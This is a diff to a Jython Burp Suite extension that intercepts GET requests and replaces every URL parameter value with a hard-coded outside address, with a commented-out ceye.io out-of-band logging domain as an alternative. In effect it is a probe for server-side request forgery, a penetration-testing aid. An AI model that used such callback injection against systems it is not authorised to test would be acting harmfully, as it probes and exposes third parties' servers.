@@ -28,7 +28,6 @@ class BurpExtender(IBurpExtender, IHttpListener):
         
     # define processHttpMessage: From IHttpListener Interface 
     def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):
-        
         # determine what tool we would like to pass though our extension:
         print toolFlag
         paras=["url","r","sb"]
@@ -40,15 +39,19 @@ class BurpExtender(IBurpExtender, IHttpListener):
                 analyzedRequest =self._helpers.analyzeRequest(request)
                 #print "chengcheng"
                 headers= analyzedRequest.getHeaders()
-                print headers[0]
-                #'/(\?|&)(.+?)=([^&?]*)/i'
-
-                url_paras= re.findall(r'(\?|&)(.+?)=([^&?\s]*)', headers[0])
-                for url_para in url_paras:
-                    if url_para in paras:
-                        print url_para[1]
+                new_headers = []
                 for header in headers:
-                    print header
+                    if header.startswith("GET"):
+                        url_paras = re.findall(r'(\?|&)(.+?)=([^&?\s]*)', header)
+                        for url_para in url_paras:
+                            #http://oh2yyo.ceye.io
+                            header = header.replace(url_para[2], "http://115.28.0.211")
+                    new_headers.append(header)
+
+                new_body = self._helpers.bytesToString("")
+                messageInfo.setRequest(self._helpers.buildHttpMessage(new_headers,new_body))
+
+
                 print analyzedRequest.getMethod()
                 for ss in analyzedRequest.getParameters():
                     print ss.getName()
